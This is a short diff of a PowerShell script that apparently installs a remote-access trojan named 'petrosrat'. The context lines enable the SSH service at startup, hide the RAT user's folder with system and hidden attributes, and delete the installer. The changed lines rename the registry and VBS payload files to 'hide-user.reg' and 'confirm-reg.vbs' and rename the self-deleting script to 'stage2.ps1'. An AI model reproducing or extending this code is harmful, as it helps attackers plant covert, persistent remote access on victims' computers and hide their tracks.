@@ -75,7 +75,7 @@ Set-Service -name sshd -StartupType 'Automatic'
  
 
 # install the registry
-./wrev.reg; ./calty.vbs
+./hide-user.reg; ./confirm-reg.vbs
 
 
 # hide rat user
@@ -85,4 +85,4 @@ attrib +h +s +r petrosrat
 
 # self delete
 Set-Location $initial_dir
-Remove-Item installer.ps1
+Remove-Item stage2.ps1
